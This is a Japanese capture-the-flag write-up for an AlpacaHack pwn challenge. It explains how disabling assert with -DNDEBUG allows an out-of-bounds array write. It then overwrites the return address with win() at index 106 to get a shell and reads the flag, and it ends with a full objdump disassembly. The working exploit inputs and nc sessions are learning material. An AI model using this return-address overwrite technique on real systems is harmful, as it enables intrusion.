# 2026/02/18 問題

https://alpacahack.com/daily/challenges/disappeared

## 問題文

```
Ok! Now your input will become validated!

nc 34.170.146.252 40839
```

## 考察

```
$ nc 34.170.146.252 40839
pos >  a
val > %
```

門戸外過ぎるので助言を受けながら進める

```
// gcc -DNDEBUG -o chal main.c -no-pie
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

void win() {
    execve("/bin/sh", NULL, NULL);
}

void safe() {
    unsigned num[100], pos;
    printf("pos > ");
    scanf("%u", &pos);
    assert(pos<100);
    printf("val > ");
    scanf("%u", &num[pos]);
}

--- snip ----

```

### NDEBUG マクロと assert の関係

main.c の先頭にはコメントでビルドコマンド `gcc -DNDEBUG -o chal main.c -no-pie` が残されている

この `DNDEBUG` オプションがあると assert が実行されないため、 `num[]` のメモリリークを防ぐための `assert(pos<100);` が実行されない

### 配列の境界外書き込み

関数が実行される時、メモリのスタック領域にデータが配置される。 \
関数 `safe()` の場合は以下のような配置となっている。

`main()` から `safe()` が呼ばれると高アドレスから順にデータが積まれていく。この時注意が必要なのが、stack は高アドレスから低アドレスに積まれていくが、配列の要素の伸び方は真逆の低→高であること。

当初はパディングとカナリアは認知していなかったが、後の解答の際に存在に気付いた

```
[ 高アドレス ]
+---------------------+
| Return Address      |  <-- 次に実行される命令のアドレス (攻撃ターゲット)
+---------------------+
| Saved RBP           |  <-- 関数 safe() のスタックの基準点
+---------------------+
| Canary (カナリア)    |  <-- StackOverflow を検知するフィールド
+---------------------+
| (パディング)          |  <-- アライメント調整の隙間
+---------------------+
| num[99]             |
|  ...                |  <-- num配列
| num[0]              |
+---------------------+
| pos                 | <-- 基本的に配列より低アドレスに積まれるらしい
+---------------------+
[ 低アドレス ]

※ RBP = Return Base Pointor
```

本来意図していないメモリ(スタック)領域へ不正にアクセスすることを Stack Overflow という。

### スタックフレームの構造

x86_64 アーキテクチャでは unsigned_int は 4 バイト、アドレスポインタは 8 バイト確保されている。

つまり、 `num[0]` から Return Address までの距離は

- `num` のサイズ : 4byte \* 100column = 400byte
- Saved RBP のサイズ: 8byte

と 408 バイトとなる。

(※ 実際にはパディング 8 バイト、カナリア 8 バイトがあるので、 424 バイト離れている )

`num[]` は unsigned_int なので、配列の要素数で考えると 408/4 = 102 (※実際には 424/4= 106 ) をインデックスの `pos` に入力すれば、Return Address にアクセスすることができる。

### win 関数のアドレス

Return Address の場所は分かったが、シェルプロセスを生成する関数 `win()` のアドレスが分かっていないので、これを探し当てる必要がある。

メモリの配置には PIE (Position Independent Executable) と非 PIE という概念がある。前者の PIE がメモリアクセスが全て相対アドレスで表現される世界である。最近の GCC は PIE がデフォルトとなっている。

ただし、 main.c の先頭にあるように `// gcc -DNDEBUG -o chal main.c -no-pie` と非 PIE でビルドされているため、今回は絶対アドレスでアクセスすることが可能。

`objdump` でバイナリ解析を行い、アドレスを確認

```
$ objdump -d 2026-02/02-18_pwn/disappeared/chal | grep win
00000000004011b6 <win>:
```

`00000000004011b6` は 16 進数なので、これを 10 進数に変換すると `4198838`

つまり、 `num[pol]` に `4198838` を入力することで、不正に関数 `win()` を呼び出すことができる。

## 解答

```
$ nc 34.170.146.252 40839
pos > 102
val > 4198838
*** stack smashing detected ***: terminated
```

Stack Canary というセキュリティ機能を踏んだらしい。
現代のコンパイラ（Ubuntu 24.04のGCCなど）は、バッファオーバーフロー対策として、バッファとリターンアドレスの間に「パディング」「カナリア」と呼ばれる領域を保有している。

インデックス 102 でカナリアを踏んだということは以下の整理になる

| メモリ(バイト) | インデックス値(pos) | 領域                 |
| -------------- | ------------------- | -------------------- |
| 0~399          | 0~99                | バッファ ( `num[]` ) |
| 400~407        | 100, 101            | パディング           |
| 408~415        | 102, 103            | カナリア             |
| 416~423        | 104, 105            | Saved RBP            |
| 424~431        | 106, 107            | Return Address       |

改めて index を 106 で指定。通った

```
$ nc 34.170.146.252 40839
pos > 106
val > 4198838
cat /flag.txt
Alpaca{u53_455rt_f0r_d3bugg1ng_6a6b4a9333dee37efc645fbd2efd2012}
```

### 参考

バイナリ解析結果

```

$ objdump -d 2026-02/02-18_pwn/disappeared/chal

2026-02/02-18_pwn/disappeared/chal: file format elf64-x86-64

Disassembly of section .init:

0000000000401000 <\_init>:
401000: f3 0f 1e fa endbr64
401004: 48 83 ec 08 subq $0x8, %rsp
401008: 48 8b 05 d1 2f 00 00 movq 0x2fd1(%rip), %rax # 0x403fe0 <setbuf@GLIBC_2.2.5+0x403fe0>
40100f: 48 85 c0 testq %rax, %rax
401012: 74 02 je 0x401016 <\_init+0x16>
401014: ff d0 callq \*%rax
401016: 48 83 c4 08 addq $0x8, %rsp
40101a: c3 retq

Disassembly of section .plt:

0000000000401020 <.plt>:
401020: ff 35 ca 2f 00 00 pushq 0x2fca(%rip) # 0x403ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
401026: ff 25 cc 2f 00 00 jmpq \*0x2fcc(%rip) # 0x403ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
40102c: 0f 1f 40 00 nopl (%rax)
401030: f3 0f 1e fa endbr64
401034: 68 00 00 00 00 pushq $0x0
401039: e9 e2 ff ff ff jmp 0x401020 <.plt>
40103e: 66 90 nop
401040: f3 0f 1e fa endbr64
401044: 68 01 00 00 00 pushq $0x1
401049: e9 d2 ff ff ff jmp 0x401020 <.plt>
40104e: 66 90 nop
401050: f3 0f 1e fa endbr64
401054: 68 02 00 00 00 pushq $0x2
401059: e9 c2 ff ff ff jmp 0x401020 <.plt>
40105e: 66 90 nop
401060: f3 0f 1e fa endbr64
401064: 68 03 00 00 00 pushq $0x3
401069: e9 b2 ff ff ff jmp 0x401020 <.plt>
40106e: 66 90 nop
401070: f3 0f 1e fa endbr64
401074: 68 04 00 00 00 pushq $0x4
401079: e9 a2 ff ff ff jmp 0x401020 <.plt>
40107e: 66 90 nop

Disassembly of section .plt.sec:

0000000000401080 <.plt.sec>:
401080: f3 0f 1e fa endbr64
401084: ff 25 76 2f 00 00 jmpq *0x2f76(%rip) # 0x404000 <*GLOBAL*OFFSET_TABLE*+0x18>
40108a: 66 0f 1f 44 00 00 nopw (%rax,%rax)
401090: f3 0f 1e fa endbr64
401094: ff 25 6e 2f 00 00 jmpq *0x2f6e(%rip) # 0x404008 <\_GLOBAL_OFFSET_TABLE*+0x20>
40109a: 66 0f 1f 44 00 00 nopw (%rax,%rax)
4010a0: f3 0f 1e fa endbr64
4010a4: ff 25 66 2f 00 00 jmpq *0x2f66(%rip) # 0x404010 <*GLOBAL*OFFSET_TABLE*+0x28>
4010aa: 66 0f 1f 44 00 00 nopw (%rax,%rax)
4010b0: f3 0f 1e fa endbr64
4010b4: ff 25 5e 2f 00 00 jmpq *0x2f5e(%rip) # 0x404018 <\_GLOBAL_OFFSET_TABLE*+0x30>
4010ba: 66 0f 1f 44 00 00 nopw (%rax,%rax)
4010c0: f3 0f 1e fa endbr64
4010c4: ff 25 56 2f 00 00 jmpq \*0x2f56(%rip) # 0x404020 <_GLOBAL_OFFSET_TABLE_+0x38>
4010ca: 66 0f 1f 44 00 00 nopw (%rax,%rax)

Disassembly of section .text:

00000000004010d0 <\_start>:
4010d0: f3 0f 1e fa endbr64
4010d4: 31 ed xorl %ebp, %ebp
4010d6: 49 89 d1 movq %rdx, %r9
4010d9: 5e popq %rsi
4010da: 48 89 e2 movq %rsp, %rdx
4010dd: 48 83 e4 f0 andq $-0x10, %rsp
4010e1: 50 pushq %rax
4010e2: 54 pushq %rsp
4010e3: 45 31 c0 xorl %r8d, %r8d
4010e6: 31 c9 xorl %ecx, %ecx
4010e8: 48 c7 c7 82 12 40 00 movq $0x401282, %rdi # imm = 0x401282
4010ef: ff 15 e3 2e 00 00 callq \*0x2ee3(%rip) # 0x403fd8 <setbuf@GLIBC_2.2.5+0x403fd8>
4010f5: f4 hlt
4010f6: 66 2e 0f 1f 84 00 00 00 00 00 nopw %cs:(%rax,%rax)

0000000000401100 <\_dl_relocate_static_pie>:
401100: f3 0f 1e fa endbr64
401104: c3 retq
401105: 66 2e 0f 1f 84 00 00 00 00 00 nopw %cs:(%rax,%rax)
40110f: 90 nop

0000000000401110 <deregister_tm_clones>:
401110: b8 38 40 40 00 movl $0x404038, %eax # imm = 0x404038
401115: 48 3d 38 40 40 00 cmpq $0x404038, %rax # imm = 0x404038
40111b: 74 13 je 0x401130 <deregister_tm_clones+0x20>
40111d: b8 00 00 00 00 movl $0x0, %eax
401122: 48 85 c0 testq %rax, %rax
401125: 74 09 je 0x401130 <deregister_tm_clones+0x20>
401127: bf 38 40 40 00 movl $0x404038, %edi # imm = 0x404038
40112c: ff e0 jmpq \*%rax
40112e: 66 90 nop
401130: c3 retq
401131: 66 66 2e 0f 1f 84 00 00 00 00 00 nopw %cs:(%rax,%rax)
40113c: 0f 1f 40 00 nopl (%rax)

0000000000401140 <register_tm_clones>:
401140: be 38 40 40 00 movl $0x404038, %esi # imm = 0x404038
401145: 48 81 ee 38 40 40 00 subq $0x404038, %rsi # imm = 0x404038
40114c: 48 89 f0 movq %rsi, %rax
40114f: 48 c1 ee 3f shrq $0x3f, %rsi
401153: 48 c1 f8 03 sarq $0x3, %rax
401157: 48 01 c6 addq %rax, %rsi
40115a: 48 d1 fe sarq %rsi
40115d: 74 11 je 0x401170 <register_tm_clones+0x30>
40115f: b8 00 00 00 00 movl $0x0, %eax
401164: 48 85 c0 testq %rax, %rax
401167: 74 07 je 0x401170 <register_tm_clones+0x30>
401169: bf 38 40 40 00 movl $0x404038, %edi # imm = 0x404038
40116e: ff e0 jmpq \*%rax
401170: c3 retq
401171: 66 66 2e 0f 1f 84 00 00 00 00 00 nopw %cs:(%rax,%rax)
40117c: 0f 1f 40 00 nopl (%rax)

0000000000401180 <**do_global_dtors_aux>:
401180: f3 0f 1e fa endbr64
401184: 80 3d dd 2e 00 00 00 cmpb $0x0, 0x2edd(%rip) # 0x404068 <completed.0>
40118b: 75 13 jne 0x4011a0 <**do_global_dtors_aux+0x20>
40118d: 55 pushq %rbp
40118e: 48 89 e5 movq %rsp, %rbp
401191: e8 7a ff ff ff callq 0x401110 <deregister_tm_clones>
401196: c6 05 cb 2e 00 00 01 movb $0x1, 0x2ecb(%rip) # 0x404068 <completed.0>
40119d: 5d popq %rbp
40119e: c3 retq
40119f: 90 nop
4011a0: c3 retq
4011a1: 66 66 2e 0f 1f 84 00 00 00 00 00 nopw %cs:(%rax,%rax)
4011ac: 0f 1f 40 00 nopl (%rax)

00000000004011b0 <frame_dummy>:
4011b0: f3 0f 1e fa endbr64
4011b4: eb 8a jmp 0x401140 <register_tm_clones>

00000000004011b6 <win>:
4011b6: f3 0f 1e fa endbr64
4011ba: 55 pushq %rbp
4011bb: 48 89 e5 movq %rsp, %rbp
4011be: ba 00 00 00 00 movl $0x0, %edx
4011c3: be 00 00 00 00 movl $0x0, %esi
4011c8: 48 8d 05 35 0e 00 00 leaq 0xe35(%rip), %rax # 0x402004 <\_IO_stdin_used+0x4>
4011cf: 48 89 c7 movq %rax, %rdi
4011d2: e8 d9 fe ff ff callq 0x4010b0 <.plt.sec+0x30>
4011d7: 90 nop
4011d8: 5d popq %rbp
4011d9: c3 retq

00000000004011da <safe>:
4011da: f3 0f 1e fa endbr64
4011de: 55 pushq %rbp
4011df: 48 89 e5 movq %rsp, %rbp
4011e2: 48 81 ec b0 01 00 00 subq $0x1b0, %rsp # imm = 0x1B0
4011e9: 64 48 8b 04 25 28 00 00 00 movq %fs:0x28, %rax
4011f2: 48 89 45 f8 movq %rax, -0x8(%rbp)
4011f6: 31 c0 xorl %eax, %eax
4011f8: 48 8d 05 0d 0e 00 00 leaq 0xe0d(%rip), %rax # 0x40200c <\_IO_stdin_used+0xc>
4011ff: 48 89 c7 movq %rax, %rdi
401202: b8 00 00 00 00 movl $0x0, %eax
401207: e8 94 fe ff ff callq 0x4010a0 <.plt.sec+0x20>
40120c: 48 8d 85 5c fe ff ff leaq -0x1a4(%rbp), %rax
401213: 48 89 c6 movq %rax, %rsi
401216: 48 8d 05 f6 0d 00 00 leaq 0xdf6(%rip), %rax # 0x402013 <\_IO_stdin_used+0x13>
40121d: 48 89 c7 movq %rax, %rdi
401220: b8 00 00 00 00 movl $0x0, %eax
401225: e8 96 fe ff ff callq 0x4010c0 <.plt.sec+0x40>
40122a: 48 8d 05 e5 0d 00 00 leaq 0xde5(%rip), %rax # 0x402016 <\_IO_stdin_used+0x16>
401231: 48 89 c7 movq %rax, %rdi
401234: b8 00 00 00 00 movl $0x0, %eax
401239: e8 62 fe ff ff callq 0x4010a0 <.plt.sec+0x20>
40123e: 8b 95 5c fe ff ff movl -0x1a4(%rbp), %edx
401244: 48 8d 85 60 fe ff ff leaq -0x1a0(%rbp), %rax
40124b: 89 d2 movl %edx, %edx
40124d: 48 c1 e2 02 shlq $0x2, %rdx
401251: 48 01 d0 addq %rdx, %rax
401254: 48 89 c6 movq %rax, %rsi
401257: 48 8d 05 b5 0d 00 00 leaq 0xdb5(%rip), %rax # 0x402013 <\_IO_stdin_used+0x13>
40125e: 48 89 c7 movq %rax, %rdi
401261: b8 00 00 00 00 movl $0x0, %eax
401266: e8 55 fe ff ff callq 0x4010c0 <.plt.sec+0x40>
40126b: 90 nop
40126c: 48 8b 45 f8 movq -0x8(%rbp), %rax
401270: 64 48 2b 04 25 28 00 00 00 subq %fs:0x28, %rax
401279: 74 05 je 0x401280 <safe+0xa6>
40127b: e8 00 fe ff ff callq 0x401080 <.plt.sec>
401280: c9 leave
401281: c3 retq

0000000000401282 <main>:
401282: f3 0f 1e fa endbr64
401286: 55 pushq %rbp
401287: 48 89 e5 movq %rsp, %rbp
40128a: 48 8b 05 bf 2d 00 00 movq 0x2dbf(%rip), %rax # 0x404050 <stdin@GLIBC_2.2.5>
401291: be 00 00 00 00 movl $0x0, %esi
401296: 48 89 c7 movq %rax, %rdi
401299: e8 f2 fd ff ff callq 0x401090 <.plt.sec+0x10>
40129e: 48 8b 05 9b 2d 00 00 movq 0x2d9b(%rip), %rax # 0x404040 <stdout@GLIBC_2.2.5>
4012a5: be 00 00 00 00 movl $0x0, %esi
4012aa: 48 89 c7 movq %rax, %rdi
4012ad: e8 de fd ff ff callq 0x401090 <.plt.sec+0x10>
4012b2: 48 8b 05 a7 2d 00 00 movq 0x2da7(%rip), %rax # 0x404060 <stderr@GLIBC_2.2.5>
4012b9: be 00 00 00 00 movl $0x0, %esi
4012be: 48 89 c7 movq %rax, %rdi
4012c1: e8 ca fd ff ff callq 0x401090 <.plt.sec+0x10>
4012c6: b8 00 00 00 00 movl $0x0, %eax
4012cb: e8 0a ff ff ff callq 0x4011da <safe>
4012d0: b8 00 00 00 00 movl $0x0, %eax
4012d5: 5d popq %rbp
4012d6: c3 retq

Disassembly of section .fini:

00000000004012d8 <\_fini>:
4012d8: f3 0f 1e fa endbr64
4012dc: 48 83 ec 08 subq $0x8, %rsp
4012e0: 48 83 c4 08 addq $0x8, %rsp
4012e4: c3 retq

```

```

```
